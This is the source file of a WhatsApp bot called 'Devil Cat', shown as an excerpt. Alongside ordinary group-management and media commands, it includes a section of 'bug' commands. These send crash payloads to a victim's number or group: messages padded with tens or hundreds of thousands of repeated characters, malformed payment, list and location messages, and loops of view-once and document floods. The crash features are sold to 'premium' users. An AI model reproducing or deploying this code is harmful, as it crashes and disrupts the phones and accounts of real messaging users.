...
//bug database
const { xeontext1 } = require('./NoName/xeontext1')
const { xeontext2 } = require('./NoName/xeontext2')
const { xeontext3 } = require('./NoName/xeontext3')
const { xeontext4 } = require('./NoName/xeontext4')
const { xeontext5 } = require('./NoName/xeontext5')
const { xeontext6 } = require('./NoName/xeontext6')
const { xeontext7 } = require('./NoName/xeontext7')
const { xeontext8 } = require('./NoName/xeontext8')
const { xeontext9 } = require('./NoName/xeontext9')
const { xeontext10 } = require('./NoName/xeontext10')
const { xeontext11 } = require('./NoName/xeontext11')
const wkwk = fs.readFileSync(`./NoName/x.mp3`)
const xsteek = fs.readFileSync(`./NoName/x.webp`)
const o = fs.readFileSync(`./NoName/o.jpg`)
...
module.exports = devilcat = async (DevilCat, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
        ...
        const botNumber = await DevilCat.decodeJid(DevilCat.user.id)
        ...
        const groupMetadata = m.isGroup ? await DevilCat.groupMetadata(m.chat).catch(e => {}) : ''
        ...
        const clientId = DevilCat.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? DevilCat.user.id.split(':')[0] + "@s.whatsapp.net" || DevilCat.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(DevilCat, m, premium);
//group chat msg by xeon
const replygcxeon = (teks) => {
DevilCat.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
...
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./DevilGallery/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
...
"jpegThumbnail": fs.readFileSync(`./NoName/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
await DevilCat.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.imgur.com/5jNLcST.jpeg" } }, { upload: DevilCat.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
await DevilCat.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊"+" ".repeat(920000),
        'footerText': `𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊`,
        'description': `𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   DevilCat.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
...
async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    ...
    DevilCat.relayMessage(jid, messageContent.message, {
...
async function sendSystemCrashMessage(jid) {
  ...
  await DevilCat.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
...
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return DevilCat.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
...
DevilCat.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Error...")
})
}
...
let { key } = await DevilCat.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await DevilCat.sendMessage(from, {text: xeonlod[i], edit: key });
}
}
        ...
        if (autoread) {
            DevilCat.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        DevilCat.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        DevilCat.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        DevilCat.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        DevilCat.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            DevilCat.updateProfileStatus(`Hey There, I'm Using a Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return DevilCat.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await DevilCat.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await DevilCat.getName(i)}\nFN:${await DevilCat.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
...
let audiobuffy = fs.readFileSync(`./DevilGallery/audio/${BhosdikaXeon}.mp3`)
DevilCat.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./DevilGallery/sticker/${BhosdikaXeon}.webp`)
DevilCat.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./DevilGallery/image/${BhosdikaXeon}.jpg`)
DevilCat.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./DevilGallery/video/${BhosdikaXeon}.mp4`)
DevilCat.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
DevilCat.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./DevilGallery/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
DevilCat.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./DevilGallery/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}
...
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./DevilGallery/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        ...
        if (m.isGroup && !m.key.fromMe) {
            ...
            if (afk.checkAfkUser(m.sender, _afk)) {
                ...
                DevilCat.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
            ...
            case 'join':
                try {
                    ...
                    await DevilCat.groupAcceptInvite(result).then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                } catch {
    ...
    case 'autostatusview':{
            ...
            case 'autobio':
                ...
                break
                case "noname-ai": case "chatgpt": case "gpt": {
if (!text) return replygcxeon(`*• Example:* ${prefix + command} how to make girl pregnant`);
  try {
    let letmegpt = await (await fetch(`https://api.shannmoderz.xyz/ai/letmegpt?query=${text}`)).json()
    let shannz = letmegpt.result
    m.reply(shannz)
  } catch (err) {
  ...
  viewOnceMessage: {
    message: {
        ...
        interactiveMessage: proto.Message.InteractiveMessage.create({
          ...
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./NoName/xx2.jpg')}, { upload: DevilCat.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
...
await DevilCat.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygcxeon("`*Error*`")
}
}
    break
case 'devilcat-ai': case "ai": case "openai": {
if (!text) return replygcxeon(`*• Example:* ${prefix + command} how to make girl pregnant`);
  try {
    let gemi = await (await fetch(`https://api.shannmoderz.xyz/ai/gemini?query=${text}`)).json()
    let shannz = gemi.result[0]
    m.reply(shannz)
  } catch (err) {
      m.reply('masukkan query lainnya atau coba lagi nanti')
    }
...
break
            case 'mode':
                ...
                if (q == 'public') {
                    DevilCat.public = true
                    replygcxeon(mess.done)
                } else if (q == 'self') {
                    DevilCat.public = false
                    replygcxeon(mess.done)
                }
                break
            case 'setexif':
            ...
            case 'setppbot':
                ...
                var medis = await DevilCat.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await DevilCat.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                    ...
                    var memeg = await DevilCat.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
            ...
            case 'block':
                ...
                await DevilCat.updateBlockStatus(blockw, 'block').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replygcxeon(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DevilCat.updateBlockStatus(blockww, 'unblock').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'leave':
                if (!isCreator) return replygcxeon(mess.owner)
                if (!m.isGroup) return replygcxeon(mess.group)
                replygcxeon('sayōnara min`na 🥺')
                await DevilCat.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replygcxeon(mess.owner)
                ...
                await DevilCat.sendMessage(m.chat, {
                    document: malas,
            ...
            case 'bcgroup': {
                ...
                let getGroups = await DevilCat.groupFetchAllParticipating()
                    ...
                    DevilCat.sendMessage(i, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                ...
                                thumbnailUrl: 'https://i.imgur.com/5jNLcST.jpeg',
            ...
            case 'closetime':
                ...
                setTimeout(() => {
                    ...
                    DevilCat.groupSettingUpdate(m.chat, 'announcement')
                    replygcxeon(close)
                }, timer)
                break
            case 'opentime':
                ...
                setTimeout(() => {
                    ...
                    DevilCat.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcxeon(open)
                }, timer)
                break
            case 'kick':
                ...
                await DevilCat.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                ...
                await DevilCat.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                ...
                await DevilCat.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                ...
                await DevilCat.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcxeon(mess.group)
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await DevilCat.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcxeon(mess.group)
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!text) return 'Text ?'
                await DevilCat.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                ...
                if (args[0] == 'full') {
                    ...
                    var memeg = await DevilCat.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcxeon(mess.done)
            ...
            case 'grup':
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'close') {
                    await DevilCat.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcxeon(`Success In Closing The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'open') {
                    await DevilCat.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success In Opening The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
            ...
            case 'editinfo':
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'open') {
                    await DevilCat.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'close') {
                    await DevilCat.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcxeon(json(err)))
                } else {
            ...
            case 'linkgc':
                ...
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let response = await DevilCat.groupInviteCode(m.chat)
                DevilCat.sendText(m.chat, `👥 *GROUP LINK INFO*\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬
            ...
            case 'resetlink':
                ...
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                await DevilCat.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcxeon(`SuccessfulynReset Group Invite Link ${groupMetadata.subject}`)
...
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`.trim()
            ...
            break
            case 'runtime':
                let runtimetext = `𝕯𝖊𝖛𝖎𝖑 𝕮𝖆𝖙 𝓥2 𝕭𝖚𝖌 𝖇𝖔𝖙 Havs Been Active For ${runtime(process.uptime())}`
                DevilCat.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
            ...
            case 'script':
                DevilCat.sendMessage(m.chat, {
                    text: `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
                    ┏━━⊱ THE SCRIPT OF ${botname} IS ON: 
┣❏  YouTube: https://youtube.com/@No-Name-Tech
${readmore}
┣❏. WhatsApp: https://whatsapp.com/channel/0029VadIfkvFSAt7RRohyF0t
                   ▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
                            THE SCRIPT OF ${botname} is on YouTube @No-Name-Tech
                            ▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
                            thumbnailUrl: 'https://i.imgur.com/5jNLcST.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                ...
                DevilCat.sendMessage(m.chat, {
                    text: `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
                    ┏━━⊱ There was a time, when the world was ruled by scammers. But then came a great man who swore to bring an end to this reign of scammers. His name is 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊. and he says...
                   ...This is the rise of 𝕯𝖊𝖛𝖎𝖑 𝕮𝖆𝖙
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
                            THE SCRIPT OF ${botname} IS ON YouTube https://youtube.com/@No-Name-Tech
                            ▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
                            thumbnailUrl: 'https://i.imgur.com/5jNLcST.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
            ...
            case 'opay':
                ...
                ▬▭▬▭▬▭▬▭▬▬▭▬▭▬`
                DevilCat.sendMessage(m.chat, {
                    text: 'Opay 8133286181 \n\n' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await DevilCat.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
DevilCat.sendMessage(from, { text : `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Hi @${sender.split("@")[0]}, This is my Owner
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                ...
                if (/image/.test(mime)) {
                    ...
                    let encmedia = await DevilCat.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    ...
                    let media = await quoted.download()
                    let encmedia = await DevilCat.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
            ...
            case 'smeme': {
                ...
                let dwnld = await DevilCat.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await DevilCat.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
...
DevilCat.downloadAndSaveMediaMessage(quoted, "gifee")
DevilCat.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await DevilCat.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await DevilCat.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
...
break
            ...
            case 'toimg': {
                ...
                replygcxeon(mess.wait)
                let media = await DevilCat.downloadAndSaveMediaMessage(qmsg)
            ...
            case 'toaudio': {
                ...
                replygcxeon(mess.wait)
                let media = await DevilCat.downloadMediaMessage(qmsg)
            ...
            case 'emojimix': {
                ...
                for (let res of anu.results) {
                    let encmedia = await DevilCat.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
            ...
            case 'toviewonce': {
                ...
                if (/image/.test(mime)) {
                    anuan = await DevilCat.downloadAndSaveMediaMessage(quoted)
                    DevilCat.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                    ...
                    anuanuan = await DevilCat.downloadAndSaveMediaMessage(quoted)
                    DevilCat.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
            ...
            case 'toqr': {
                ...
                await DevilCat.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
...
let ceknye = await DevilCat.onWhatsApp(bnnd)
...
break
            case 'addvideo': {
                ...
                let delb = await DevilCat.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./DevilGallery/video/${q}.mp4`)
            ...
            case 'delvideo': {
                ...
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./DevilGallery/video/${q}.mp4`)
            ...
            case 'addimage': {
                ...
                let delb = await DevilCat.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./DevilGallery/image/${q}.jpg`)
            ...
            case 'delimage': {
                ...
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./DevilGallery/image/${q}.jpg`)
            ...
            case 'addsticker': {
                ...
                let delb = await DevilCat.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./DevilGallery/sticker/${q}.webp`)
            ...
            case 'delsticker': {
                ...
                StickerDevilCat.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./DevilGallery/sticker/${q}.webp`)
            ...
            case 'addvn': {
                ...
                await fsx.copy(delb, `./DevilGallery/audio/${q}.mp3`)
            ...
            case 'delvn': {
                ...
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./DevilGallery/audio/${q}.mp3`)
...
let delb = await DevilCat.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./DevilGallery/zip/${teks}.zip`)
...
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./DevilGallery/zip/${teks}.zip`)
...
let delb = await DevilCat.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./DevilGallery/apk/${teks}.apk`)
...
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./DevilGallery/apk/${teks}.apk`)
...
let delb = await DevilCat.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./DevilGallery/doc/${teks}.pdf`)
...
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./DevilGallery/doc/${teks}.pdf`)
...
const { ytmp3 } = require("./lib/scraper");
                    let yts = require("yt-search");
                    let search = await yts(text);
                    let anup3k = search.videos[0];
                    try {
                        const aud = await ytmp3(anup3k.url);
                    } catch {
                        replygcxeon("try again later");
                    }
...
const xeonaudp3 = require('./lib/scraper')
...
const xeonvidoh = require('./lib/scraper')
...
case 'sound160':
case 'sound161':
DevilCat_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await DevilCat.sendMessage(m.chat, { audio: DevilCat_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case "no-name": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 23481332xxxxx,5`) 
  ...
  var contactInfo = await DevilCat.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
...
case "i-tempest":
  ...
  case "infinite-void":
  {
    ...
    try {
      ...
      let groupTarget = await DevilCat.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      DevilCat.groupLeave(groupTarget);
    } catch (error) {
...
case 'sayo-nara': case 'bankai': {
	if (!isCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Usage .${command} 2348133286181`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 2348133286181`)
var contactInfo = await DevilCat.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "2348133286181") {
    return;
  ...
  async function xeonIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await DevilCat.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊',
								matchedText: 'THROUGHOUT THE HEAVENS AND THE EARTH, NO NAME ALONE IS THE HONOURED ONE',
								canonicalUrl: 'https://example.com',
								description: '𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊  𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊',
								title: '𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊',
								textArgb: 0xff000000,
							...
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										...
										body: {
											text: '𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊 https://i.imgur.com/5jNLcST.jpeg',
										},
										footer: {
											text: 'xp',
										},
...
await replygcxeon(`In process....`)
    ...
    [whatsappNumber]
				...
				break;
				case 'turbulent-spear': case 'turbulence': {
					if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Usage .${command} 2348133286181`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 2348133286181`)
var contactInfo = await DevilCat.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  ...
  async function xeonBugPay(jid){
    ...
    [whatsappNumber]
				...
				break;
		case '2nd-form': case '3rd-form': case '4th-form': case '5th-form': case '6th-form': case '7th-form': case '8th-form': case '9th-form': case '10th-form': {
if (!isPremium) return replygcxeon(mess.prem)
if (!q) return replygcxeon(`Usage .${command} 2348133286181`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 2348133286181`)
...
async function xeonFreeze(jid){
	  for (let i = 0; i < 50; i++) {
await DevilCat.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊" + noname1,
    'mimetype': "application/zip",
    'caption': "𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊" + noname1,
...
await xeonFreeze(m.chat);
	...
	break
	case 'r-e-d': case 'nameless-web': case 'b-l-u-e': {
		if (!isPremium) return replygcxeon(mess.prem)
		const xeonimage = {
    title: "𝕷𝖔𝖗𝖉 𝕹𝖔 𝕹𝖆𝖒𝖊; ",
    hasMediaAttachment: true,
...
DevilCat.relayMessage(m.chat, {
    'viewOnceMessage': {
		...
		break
		case 'nameless-error': case 'err-or':{
			if (!isPremium) return replygcxeon(mess.prem)
			const subscribe_dgxeon = {
"key": { 
"fromMe": false,
...
